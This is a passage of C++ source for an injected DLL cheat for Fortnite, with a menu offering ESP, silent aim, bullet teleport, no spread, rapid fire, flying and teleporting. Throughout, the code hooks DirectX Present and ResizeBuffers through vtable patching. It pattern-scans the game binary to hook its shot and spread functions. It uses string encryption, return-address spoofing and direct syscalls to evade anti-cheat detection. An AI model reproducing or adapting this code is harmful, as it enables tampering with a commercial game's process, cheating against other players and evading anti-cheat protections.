					if (SubTab(skCrypt("World ESP"), ImVec2(119, 25), Active_Visuals_Tab == 2 ? true : false))
						Active_Visuals_Tab = 2;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						if (Active_Visuals_Tab == 1) {
							ImGui::Checkbox(skCrypt("2D Box"), &Settings::Box2D);
							ImGui::Checkbox(skCrypt("3D Box"), &Settings::Box3D);
							ImGui::Checkbox(skCrypt("Line ESP"), &Settings::SnapLines);
							ImGui::Checkbox(skCrypt("Corner Box"), &Settings::BoxCorner);
							//ImGui::Checkbox(skCrypt("Skeleton High Res"), &Settings::Skeleton_yhasgvdyuasfgdtasfdtasfd);
							ImGui::Checkbox(skCrypt("Skeleton"), &Settings::Skeleton_Low);
							ImGui::Checkbox(skCrypt("Distance"), &Settings::DistanceESP);
							ImGui::Checkbox(skCrypt("Bot/Ai"), &Settings::botai);
							ImGui::Checkbox(skCrypt("PlayerWeapons"), &Settings::PlayerWeapons);
							//ImGui::Checkbox(skCrypt("PlayerAmmo"), &Settings::PlayerAmmo);
							ImGui::Checkbox(skCrypt("PlayerDying"), &Settings::playerdying);
							/*ImGui::Checkbox(skCrypt("PlayerNames"), &Settings::PlayerNames);*/
							ImGui::Checkbox(skCrypt("PlayerNearby"), &Settings::ActorsAround);

						}
						if (Active_Visuals_Tab == 2) {
							ImGui::Checkbox(skCrypt("Vehicles"), &Settings::VehiclesESP);
							ImGui::Checkbox(skCrypt("Animals"), &Settings::animalsESP);
							ImGui::Checkbox(skCrypt("IO Guards"), &Settings::ioguardESP);
							/*ImGui::Checkbox(skCrypt("Loot"), &Settings::LootESP);*/
							ImGui::Checkbox(skCrypt("Vending Machines"), &Settings::vendingmachineESP);
							ImGui::Checkbox(skCrypt("Burried Treasures"), &Settings::burriedtreasureESP);
							ImGui::Checkbox(skCrypt("Traders"), &Settings::tradersESP);
							/*ImGui::Checkbox(skCrypt("Zombies"), &Settings::ZombiesESP);*/
							ImGui::Checkbox(skCrypt("Fireflys"), &Settings::FireflysESP);
							/*ImGui::Checkbox(skCrypt("Turrets"), &Settings::placeables);*/
						}
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();

				ImGui::SetCursorPos({ 402,40 });
				ImGui::BeginChild(skCrypt("Test Group##4"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("ESP Settings"), ImVec2(237, 25), Active_Visuals_Tab2 == 1 ? true : false))
						Active_Visuals_Tab2 = 1;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						ImGui::Text(skCrypt("Visual ESP Distance: %.0f"), Settings::MaxESPDistance);
						ImGui::SliderFloat(skCrypt("##Visual ESP Distance"), &Settings::MaxESPDistance, 1, 400, skCrypt("%.3f"));
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();
			}
			if (Active_Tab == 3) {
				ImGui::SetCursorPos({ 160,40 });
				ImGui::BeginChild(skCrypt("Test Group##5"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Misc"), ImVec2(118, 25), Active_Misc_Tab == 1 ? true : false))
						Active_Misc_Tab = 1;
					ImGui::SetCursorPos({ 118,0 });
					if (SubTab(skCrypt("Menu Cursors"), ImVec2(119, 25), Active_Misc_Tab == 2 ? true : false))
						Active_Misc_Tab = 2;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						if (Active_Misc_Tab == 1) {
							ImGui::Checkbox(skCrypt("Show Fov Circle"), &Settings::ShowFovCircle);
							ImGui::Checkbox(skCrypt("Crosshair"), &Settings::crosshair);
							/*ImGui::Checkbox(skCrypt("Object Debug"), &Settings::objectdebug);*/
						}
						if (Active_Misc_Tab == 2) {
							ImGui::Checkbox(skCrypt("Rainbow Menu Cursor"), &Settings::RainbowMenuCursor);
							ImGui::Checkbox(skCrypt("Normal Menu Cursor (defualt)"), &Settings::NormalMenuCursor);
						}
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();

				ImGui::SetCursorPos({ 402,40 });
				ImGui::BeginChild(skCrypt("Test Group##6"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Update Logs"), ImVec2(237, 25), Active_Misc_Tab2 == 1 ? true : false))
						Active_Misc_Tab2 = 1;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						ImGui::Text(skCrypt("[+] Fixed Crashing When In Going In Game"));
						ImGui::Text(skCrypt("[+] Fixed Carfly Crash When FOV Changer On"));
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();
			}
			if (Active_Tab == 4) {
				ImGui::SetCursorPos({ 160,40 });
				ImGui::BeginChild(skCrypt("Test Group##7"), { 237,399 }, true);
				{
					if (SubTab(skCrypt("Exploits"), ImVec2(237, 25), Active_Exploit_Tab == 1 ? true : false))
						Active_Exploit_Tab = 1;
					ImGui::SetCursorPos({ 8,30 });
					ImGui::BeginGroup();
					{
						if (Active_Exploit_Tab == 1) {
							//ImGui::Checkbox(skCrypt("Vehicle Marker TP [SHIFT]"), &Settings::MarkerTP);
							ImGui::Checkbox(skCrypt("FOV Changer [RISK]"), &Settings::bUseFOV);
							ImGui::Checkbox(skCrypt("Client Sided Invisibility [RISK]"), &Settings::Invis_ON);
							/*ImGui::Checkbox(skCrypt("Instant Reload"), &Settings::instantreload);*/
							ImGui::Checkbox(skCrypt("No Spread"), &Settings::NoSpread);
							/*ImGui::Checkbox(skCrypt("No Recoil \"working\" "), &Settings::norecoil);*/
							/*ImGui::Checkbox(skCrypt("No Spread V2"), &Settings::NospreadV2);*/
							/*ImGui::Checkbox(skCrypt("Spinbot"), &Settings::Spinbot);*/
							ImGui::Checkbox(skCrypt("Rapid Fire"), &Settings::RapidFire);
							//ImGui::Checkbox(skCrypt("me and the valhax hitting p"), &Settings::Speed);
							/*ImGui::Checkbox(skCrypt("Instant Reload \"working\" "), &Settings::instantreload);*/
							//ImGui::Checkbox(skCrypt("Instant Reload V2"), &Settings::test1);
							ImGui::Checkbox(skCrypt("Instant Weapon Swap"), &Settings::Anim);
							ImGui::Checkbox(skCrypt("Aim While Jumping"), &Settings::AimWhileJumping);
							ImGui::Checkbox(skCrypt("Player Fly [RISK] (Turn On In Game)"), &Settings::playerflyez);
							ImGui::Checkbox(skCrypt("Car Fly [RISK] (Turn On In Vehicle)"), &Settings::vehiclefly);
							ImGui::Checkbox(skCrypt("Vehicle Location TP [RISK]"), &Settings::EnableTP);
							ImGui::Checkbox(skCrypt("Vehicle Auto KILL TP [SPACE + W] [RISK]"), &Settings::CarTpToPing);
							ImGui::Checkbox(skCrypt("Vehicle Player TP [F7] [RISK]"), &Settings::CarTpToPlayer);
							ImGui::Checkbox(skCrypt("Instant Revive"), &Settings::InstantRevive);
							ImGui::Checkbox(skCrypt("AirStuck"), &Settings::AirStuck);
							//ImGui::Checkbox(skCrypt("Server AirStuck"), &Settings::ServerAirStuck_asuyhdhgasuydgausydgasuydgasuydg);
							if (ImGui::Button(skCrypt("ClientSidedDBNO ON"), ImVec2(107, 18))) {
								Settings::fakedownON = true;
							}
							if (ImGui::Button(skCrypt("ClientSidedDBNO OFF"), ImVec2(110, 18))) {
								Settings::fakedownOFF = true;
							}
							if (ImGui::Button(skCrypt("FirstPerson"), ImVec2(63, 18))) {
								Settings::FirstCamera = true;
							}
						}
						ImGui::EndGroup();
					}
					ImGui::EndChild();

					ImGui::SetCursorPos({ 402,40 });
					ImGui::BeginChild(skCrypt("Test Group##8"), { 237,399 }, true);
					{
						if (SubTab(skCrypt("Exploit Settings"), ImVec2(237, 25), Active_Exploit_Tab2 == 1 ? true : false))
							Active_Exploit_Tab2 = 1;
						ImGui::SetCursorPos({ 8,30 });
						ImGui::BeginGroup();
						{
							ImGui::Text(skCrypt("FOV Changer Value: %.3f"), Settings::fov_change_value);
							ImGui::SliderFloat(skCrypt("##FOV Changer Value"), &Settings::fov_change_value, 80.0, 150.0, skCrypt("%.3f"));

							ImGui::Text(skCrypt("Car Fly Speed Value: %.3f"), Settings::vehicleflyspeed);
							ImGui::SliderFloat(skCrypt("##Fly Speed Value"), &Settings::vehicleflyspeed, 1, 1000, skCrypt("%.3f"));

							ImGui::Spacing();

							if (Settings::EnableTP) {
								if (ImGui::Button(skCrypt("LazyLake"), ImVec2(107, 18))) {
									Settings::TP_lazylake = true;
								}
								if (ImGui::Button(skCrypt("WeepingWoods"), ImVec2(107, 18))) {
									Settings::TP_WeepingWoods = true;
								}
								if (ImGui::Button(skCrypt("RetailRow"), ImVec2(107, 18))) {
									Settings::TP_RetailRow = true;
								}
								if (ImGui::Button(skCrypt("SlurpySwamp"), ImVec2(107, 18))) {
									Settings::TP_SlurpySwamp = true;
								}
								if (ImGui::Button(skCrypt("BoneyBurbs"), ImVec2(107, 18))) {
									Settings::TP_BoneyBurbs = true;
								}
								if (ImGui::Button(skCrypt("PleasantPark"), ImVec2(107, 18))) {
									Settings::TP_PleasantPark = true;
								}
								if (ImGui::Button(skCrypt("BeliverBeach"), ImVec2(107, 18))) {
									Settings::TP_BeliverBeach = true;
								}
								if (ImGui::Button(skCrypt("CornyCrops"), ImVec2(107, 18))) {
									Settings::TP_CornyCrops = true;
								}
								if (ImGui::Button(skCrypt("Craggyclifs"), ImVec2(107, 18))) {
									Settings::TP_Craggyclifs = true;
								}
								if (ImGui::Button(skCrypt("CoralCastle"), ImVec2(107, 18))) {
									Settings::TP_coralcastle = true;
								}
								if (ImGui::Button(skCrypt("HollyHedges"), ImVec2(107, 18))) {
									Settings::TP_hollyhedges = true;
								}
								if (ImGui::Button(skCrypt("SteamyStacks"), ImVec2(107, 18))) {
									Settings::TP_PreLobby = true;
								}
								if (ImGui::Button(skCrypt("PreGameLobby"), ImVec2(107, 18))) {
									Settings::TP_PreLobby = true;
								}

							}
						}
					}
					ImGui::EndGroup();
				}
				ImGui::EndChild();
			}
		}
		ImGui::End();
	}
	ImGui::Render();
}

HRESULT present_hooked(IDXGISwapChain* swapChain, UINT syncInterval, UINT flags)
{
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	static float width = 0;
	static float height = 0;
	static HWND hWnd = 0;

	if (!device_ofgiuerdtgiouyrweuoihfhvjfhjgs7)
	{          
		swapChain->GetDevice(__uuidof(device_ofgiuerdtgiouyrweuoihfhvjfhjgs7), reinterpret_cast<PVOID*>(&device_ofgiuerdtgiouyrweuoihfhvjfhjgs7));
		device_ofgiuerdtgiouyrweuoihfhvjfhjgs7->GetImmediateContext(&immediateContext_ashdgasdgasdgasdgasd);
		
		ID3D11Texture2D* renderTarget = nullptr;
		swapChain->GetBuffer(0, __uuidof(renderTarget), reinterpret_cast<PVOID*>(&renderTarget));
		device_ofgiuerdtgiouyrweuoihfhvjfhjgs7->CreateRenderTargetView(renderTarget, nullptr, &renderTargetView_ashdgbashdgasdgasdgasd);
		renderTarget->Release();

		ID3D11Texture2D* backBuffer = 0;
		swapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (PVOID*)&backBuffer);
		D3D11_TEXTURE2D_DESC backBufferDesc = { 0 };
		backBuffer->GetDesc(&backBufferDesc);

		HWND hWnd = LI_FN(FindWindowA).safe_cached()(skCrypt("UnrealWindow"), skCrypt("Fortnite  "));
		width = (float)backBufferDesc.Width;
		height = (float)backBufferDesc.Height;
		backBuffer->Release();

		ImGuiIO& io = ImGui::GetIO();
		io.Fonts->AddFontFromFileTTF(skCrypt("C:\\Windows\\Fonts\\Tahoma.ttf"), 13.0f);

		ImGui_ImplDX11_Init(hWnd, device_ofgiuerdtgiouyrweuoihfhvjfhjgs7, immediateContext_ashdgasdgasdgasdgasd);
		ImGui_ImplDX11_CreateDeviceObjects();
	}

	immediateContext_ashdgasdgasdgasdgasd->OMSetRenderTargets(1, &renderTargetView_ashdgbashdgasdgasdgasd, nullptr);
	auto& window = CreateScene();

	if (ShowMenu) {
		ImGuiIO& io = ImGui::GetIO();

		POINT p;
		SpoofCall(LI_FN(GetCursorPos).safe_cached(), &p);
		io.MousePos.x = p.x;
		io.MousePos.y = p.y;

		if (A1337GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].y = io.MousePos.y;
		}
		else {
			io.MouseDown[0] = false;
		}
	}

	if (A1337GetAsyncKeyState(VK_F2) & 1)
	{
		ShowMenu = !ShowMenu;
	}

	ActorLoop();
	Menu(window);

	return SpoofCall(present_original, swapChain, syncInterval, flags);
}

HRESULT resize_hooked(IDXGISwapChain* swapChain, UINT bufferCount, UINT width, UINT height, DXGI_FORMAT newFormat, UINT swapChainFlags) {

	ModuleBaseW = (uintptr_t)GetModuleA(0);

	ImGui_ImplDX11_Shutdown();
	renderTargetView_ashdgbashdgasdgasdgasd->Release();
	immediateContext_ashdgasdgasdgasdgasd->Release();
	device_ofgiuerdtgiouyrweuoihfhvjfhjgs7->Release();
	device_ofgiuerdtgiouyrweuoihfhvjfhjgs7 = nullptr;

	return SpoofCall(resize_original, swapChain, bufferCount, width, height, newFormat, swapChainFlags);
}

PVOID SpreadCaller = nullptr;
BOOL(*Spread)(PVOID a1, float* a2, float* a3);
BOOL SpreadHook(PVOID a1, float* a2, float* a3)
{
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	if (Settings::NoSpread && _ReturnAddress() == SpreadCaller && A1337GetAsyncKeyState(VK_LBUTTON) or A1337GetAsyncKeyState(VK_RBUTTON)) {
		return 0;
	}

	return SpoofCall(Spread, a1, a2, a3);
}

float* (*CalculateShot)(PVOID, PVOID, PVOID) = nullptr;

float* CalculateShotHook(PVOID arg0, PVOID arg1, PVOID arg2) {
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	auto ret = SpoofCall(CalculateShot, arg0, arg1, arg2);

	//  Fixed Silent

	if (ret && Settings::Bullettp || Settings::SilentAim && TargetPawn && LocalPawn)
	{
		Vector3 headvec3;
		SDK::Classes::USkeletalMeshComponent::GetBoneLocation((uintptr_t)TargetPawn, Settings::aimbone, &headvec3);
		SDK::Structs::FVector head = { headvec3.x + Settings::random_x, headvec3.y + Settings::random_y, headvec3.z + Settings::random_z };

		uintptr_t RootComp = read<uintptr_t>(LocalPawn + Offsets::RootComponent);
		Vector3 RootCompLocationvec3 = read<Vector3>(RootComp + Offsets::RelativeLocation);
		SDK::Structs::FVector RootCompLocation = { RootCompLocationvec3.x, RootCompLocationvec3.y , RootCompLocationvec3.z };
		SDK::Structs::FVector* RootCompLocation_check = &RootCompLocation;
		if (!RootCompLocation_check) return ret;
		auto root = RootCompLocation;

		auto dx = head.X - root.X;
		auto dy = head.Y - root.Y;
		auto dz = head.Z - root.Z;

		if (Settings::Bullettp) {
			ret[4] = head.X;
			ret[5] = head.Y;
			ret[6] = head.Z;
			head.Z -= 16.0f;
			root.Z += 45.0f;

			auto y = SpoofRuntime::atan2f_(head.Y - root.Y, head.X - root.X);

			root.X += SpoofRuntime::cosf_(y + 1.5708f) * 32.0f;
			root.Y += SpoofRuntime::sinf_(y + 1.5708f) * 32.0f;

			auto length = SpoofRuntime::sqrtf_(SpoofRuntime::powf_(head.X - root.X, 2) + SpoofRuntime::powf_(head.Y - root.Y, 2) + SpoofRuntime::powf_(head.Z - root.Z, 2));

			auto x = -SpoofRuntime::atan2f_(head.Z - root.Z, length);
			y = SpoofRuntime::atan2f_(head.Y - root.Y, head.X - root.X);

			x /= 2.0f;
			y /= 2.0f;

			ret[0] = -(SpoofRuntime::sinf_(x) * SpoofRuntime::sinf_(y));
			ret[1] = SpoofRuntime::sinf_(x) * SpoofRuntime::cosf_(y);
			ret[2] = SpoofRuntime::cosf_(x) * SpoofRuntime::sinf_(y);
			ret[3] = SpoofRuntime::cosf_(x) * SpoofRuntime::cosf_(y);
		}

		if (Settings::SilentAim) {
			if (dx * dx + dy * dy + dz * dz < 125000.0f) {
				ret[4] = head.X;
				ret[5] = head.Y;
				ret[6] = head.Z;
			}
			else {
				head.Z -= 16.0f;
				root.Z += 45.0f;

				auto y = SpoofRuntime::atan2f_(head.Y - root.Y, head.X - root.X);

				root.X += SpoofRuntime::cosf_(y + 1.5708f) * 32.0f;
				root.Y += SpoofRuntime::sinf_(y + 1.5708f) * 32.0f;

				auto length = SpoofRuntime::sqrtf_(SpoofRuntime::powf_(head.X - root.X, 2) + SpoofRuntime::powf_(head.Y - root.Y, 2) + SpoofRuntime::powf_(head.Z - root.Z, 2));

				auto x = -SpoofRuntime::atan2f_(head.Z - root.Z, length);
				y = SpoofRuntime::atan2f_(head.Y - root.Y, head.X - root.X);

				x /= 2.0f;
				y /= 2.0f;

				ret[0] = -(SpoofRuntime::sinf_(x) * SpoofRuntime::sinf_(y));
				ret[1] = SpoofRuntime::sinf_(x) * SpoofRuntime::cosf_(y);
				ret[2] = SpoofRuntime::cosf_(x) * SpoofRuntime::sinf_(y);
				ret[3] = SpoofRuntime::cosf_(x) * SpoofRuntime::cosf_(y);
			}
		}
	}

	return ret;
}

bool GetFOV::InitA(bool FOV) {
	if (!FOVInitialized) {
		if (FOV) {
			ObjectsAddresses::FOV = SpoofCall(FN::FindObject, (const char*)skCrypt("FOV"));
			FOVInitialized = true;
		}
	}
	return true;
}

bool GetVehicle::InitB(bool GetVehicle, bool K2_TPT) {
	if (!GetVehicleInitialized) {
		if (GetVehicle) {
			ObjectsAddresses::GetVehicle = SpoofCall(FN::FindObject2, (const char*)skCrypt("FortPlayerPawn"), (const char*)skCrypt("GetVehicle"));
			GetVehicleInitialized = true;
		}
	}
	if (!K2_TeleportToInitialized) {
		if (K2_TPT) {
			ObjectsAddresses::K2_TeleportTo = SpoofCall(FN::FindObject, (const char*)skCrypt("K2_TeleportTo"));
			K2_TeleportToInitialized = true;
		}
	}
	return true;
}

bool SetPawnVis::InitC(bool SetPawnVisA) {
	if (!SetPawnVisInitialized) {
		if (SetPawnVisA) {
			ObjectsAddresses::SetPawnVisibility = SpoofCall(FN::FindObject, (const char*)skCrypt("SetPawnVisibility"));
			SetPawnVisInitialized = true;
		}
	}
	return true;
}

bool HookFunctions::Init(bool NoSpread, bool CalcShot) {
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	if (!NoSpreadInitialized) {
		if (NoSpread) {
			auto SpreadAddr = PatternScan_Module(ModuleBaseW, skCrypt("E8 ? ? ? ? 48 8D 4B 28 E8 ? ? ? ? 48 8B C8")); //E8 ? ? ? ? 48 8D 4B 28 E8 ? ? ? ? 48 8B C8
			SpreadAddr = RelativeAddress(SpreadAddr, 5);
			HookHelper::InsertHook(SpreadAddr, (uintptr_t)SpreadHook, (uintptr_t)&Spread);

			SpreadCaller = (PVOID)(PatternScan_Module(ModuleBaseW, skCrypt("0F 57 D2 48 8D 4C 24 ? 41 0F 28 CC E8 ? ? ? ? 48 8B 4D B0 0F 28 F0 48 85 C9"))); //0F 57 D2 48 8D 4C 24 ? 41 0F 28 CC E8 ? ? ? ? 48 8B 4D B0 0F 28 F0 48 85 C9
			NoSpreadInitialized = true;
		}
	}
	if (!CalcShotInitialized) {
		if (CalcShot) {
			auto CalcShotAddr = PatternScan_Module(ModuleBaseW, skCrypt("48 8B C4 48 89 58 18 55 56 57 41 54 41 55 41 56 41 57 48 8D A8 ? ? ? ? 48 81 EC ? ? ? ? 0F 29 70 B8 0F 29 78 A8 44 0F 29 40 ? 44 0F 29 48 ? 44 0F 29 90 ? ? ? ? 44 0F 29 98 ? ? ? ? 44 0F 29 A0 ? ? ? ? 44 0F 29 A8 ? ? ? ? 48 8B 05 ? ? ? ? 48 33 C4 48 89 85 ? ? ? ? 48 8B F1")); //48 8B C4 48 89 58 18 55 56 57 41 54 41 55 41 56 41 57 48 8D A8 ? ? ? ? 48 81 EC ? ? ? ? 0F 29 70 B8 0F 29 78 A8 44 0F 29 40 ? 44 0F 29 48 ? 44 0F 29 90 ? ? ? ? 44 0F 29 98 ? ? ? ? 44 0F 29 A0 ? ? ? ? 44 0F 29 A8 ? ? ? ? 48 8B 05 ? ? ? ? 48 33 C4 48 89 85 ? ? ? ? 48 8B F1
			HookHelper::InsertHook(CalcShotAddr, (uintptr_t)CalculateShotHook, (uintptr_t)&CalculateShot);
			CalcShotInitialized = true;
		}
	}
	return true;
}

void Load()
{
	//AllocConsole();
	//FILE* fDummy;
	//freopen_s(&fDummy, skCrypt("CONOUT$"), skCrypt("w"), stdout);
	//freopen_s(&fDummy, skCrypt("CONOUT$"), skCrypt("w"), stderr);
	//freopen_s(&fDummy, skCrypt("CONIN$"), skCrypt("r"), stdin);

	ModuleBaseW = (uintptr_t)GetModuleA(0);

	Renderer_Defines::Width = ScreenCenterX + 1920;
	Renderer_Defines::Height = ScreenCenterY + 1080;

	UWorld = PatternScan_Module(ModuleBaseW, skCrypt("48 89 05 ? ? ? ? 48 8B 4B 78")); //UWorld 
	UWorld = RelativeAddress(UWorld, 7);

	auto UObjectPtr = PatternScan_Module(ModuleBaseW, skCrypt("48 8B 05 ? ? ? ? 48 8B 0C C8 48 8B 04 D1")); //Gobject
	FN::objects = decltype(FN::objects)(RelativeAddress(UObjectPtr, 7));
	
	FreeFn = PatternScan_Module(ModuleBaseW, skCrypt("48 85 C9 0F 84 ? ? ? ? 53 48 83 EC 20 48 89 7C 24 30 48 8B D9 48 8B 3D ? ? ? ? 48 85 FF 0F 84 ? ? ? ? 48 8B 07 4C 8B 40 30 48 8D 05 ? ? ? ? 4C 3B C0")); //FreeFn
	
	ProjectWorldToScreen = PatternScan_Module(ModuleBaseW, skCrypt("E8 ? ? ? ? 48 8B 5C 24 ? 41 88 07 48 83 C4 30")); //ProjectWorldToScreen0xB562EC8
	ProjectWorldToScreen = RelativeAddress(ProjectWorldToScreen, 5);
	
	LineOfSight = PatternScan_Module(ModuleBaseW, skCrypt("48 8B F9 E8 ? ? ? ? 83 7E 08 00")); ////LineOfSight
	LineOfSight = RelativeAddress(LineOfSight, 5);

	GetNameByIndex = PatternScan_Module(ModuleBaseW, skCrypt("48 89 5C 24 ? 48 89 6C 24 ? 56 57 41 56 48 81 EC ? ? ? ? 48 8B 05 ? ? ? ? 48 33 C4 48 89 84 24 ? ? ? ? 48 8B F2 4C 8B F1 E8 ? ? ? ? 45 8B 06 33 ED 41 0F B7 16 41 C1 E8 10 89 54 24 24 44 89 44 24 ? 48 8B 4C 24 ? 48 C1 E9 20 8D 3C 09 4A 03 7C C0 ? 0F B7 17 C1 EA 06 41 39 6E 04")); //GetNameByIndex

	BoneMatrix = PatternScan_Module(ModuleBaseW, skCrypt("E8 ? ? ? ? 48 8B 47 30 F3 0F 10 45")); //BoneMatrix
	BoneMatrix = RelativeAddress(BoneMatrix, 5);

	//auto GetWeaponStatsAddr = PatternScan_Module(ModuleBaseW, skCrypt("48 83 EC 28 48 8B 91 ? ? ? ? 48 85 D2 74 25 F6 81 ? ? ? ? ? 0F 85")); //GetWeaponStats
	//GetWeaponStats = reinterpret_cast<decltype(GetWeaponStats)>(RelativeAddress(GetWeaponStatsAddr, 7));

	A1337GetAsyncKeyState = (LPFN_MBA)SAFE_CALL(GetProcAddress).safe_cached()(GetModuleA(skCrypt("win32u.dll")), skCrypt("NtUserGetAsyncKeyState"));

	auto level = D3D_FEATURE_LEVEL_11_0;
	DXGI_SWAP_CHAIN_DESC sd;
	{
		ZeroMemory(&sd, sizeof sd);
		sd.BufferCount = TRUE;
		sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
		sd.BufferUsage = 0x00000020UL;
		sd.OutputWindow = SAFE_CALL(FindWindowA).safe_cached()(skCrypt("UnrealWindow"), skCrypt("Fortnite  "));
		sd.SampleDesc.Count = 1;
		sd.Windowed = TRUE;
		sd.BufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;
		sd.BufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;
		sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
	}

	IDXGISwapChain* swap_chain = nullptr;
	ID3D11Device* device = nullptr;
	ID3D11DeviceContext* context = nullptr;

	SAFE_CALL(D3D11CreateDeviceAndSwapChain).safe_cached()(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, &level, 1, D3D11_SDK_VERSION, &sd, &swap_chain, &device, nullptr, &context);

	auto* swap_chainvtable = reinterpret_cast<uintptr_t*>(swap_chain);
	swap_chainvtable = reinterpret_cast<uintptr_t*>(swap_chainvtable[0]);

	DWORD old_protect;

	SAFE_CALL(VirtualProtect).safe_cached()(swap_chainvtable, 0x1000, PAGE_EXECUTE_READWRITE, &old_protect);
	present_original = reinterpret_cast<present_fn>(reinterpret_cast<DWORD_PTR*>(swap_chainvtable[8]));
	swap_chainvtable[8] = reinterpret_cast<DWORD_PTR>(present_hooked);
	SAFE_CALL(VirtualProtect).safe_cached()(swap_chainvtable, 0x1000, old_protect, &old_protect);

	DWORD old_protect_resize;

	resize_original = reinterpret_cast<resize_fn>(reinterpret_cast<DWORD_PTR*>(swap_chainvtable[13]));
	SAFE_CALL(VirtualProtect).safe_cached()(swap_chainvtable, 0x1000, PAGE_EXECUTE_READWRITE, &old_protect_resize);
	swap_chainvtable[13] = reinterpret_cast<DWORD_PTR>(resize_hooked);
	SAFE_CALL(VirtualProtect).safe_cached()(swap_chainvtable, 0x1000, old_protect_resize, &old_protect_resize);
}

bool __stdcall DllMain(HMODULE Module, DWORD  reason_for_call, LPVOID lpReserved)
{
	UNREFERENCED_PARAMETER(Module);
	UNREFERENCED_PARAMETER(lpReserved);
	SAFE_CALL(DisableThreadLibraryCalls).safe_cached()(Module);

	if (reason_for_call == 1)
	{
		Load();
	}

	return 1;
}